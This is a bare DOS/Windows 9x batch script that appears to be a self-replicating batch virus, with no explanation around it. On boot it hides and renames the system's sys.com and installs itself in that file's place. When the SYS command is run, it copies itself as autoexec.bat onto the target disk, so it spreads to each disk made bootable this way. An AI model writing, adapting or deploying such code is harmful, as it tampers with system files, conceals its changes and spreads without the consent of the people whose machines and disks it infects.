@echo off
if !%0==! goto inboot
attrib -H %windir%\command\sys.old >nul
ren %windir%\command\sys.old sys.com >nul
%windir%\command\sys.com %1 %2
ren %windir%\command\sys.com sys.old >nul
attrib +H %windir%\command\sys.old >nul
if !%1==! goto end
if %1==/? goto end
copy /y %windir%\command\sys.bat %1\autoexec.bat >nul
copy /y %windir%\command\attrib.exe %1\attrib.exe >nul
goto end

:inboot
if exist c:\windows\command\sys.old goto end
ren c:\windows\command\sys.com sys.old >nul
attrib +H c:\windows\command\sys.old >nul
copy /y autoexec.bat c:\windows\command\sys.bat >nul

:end
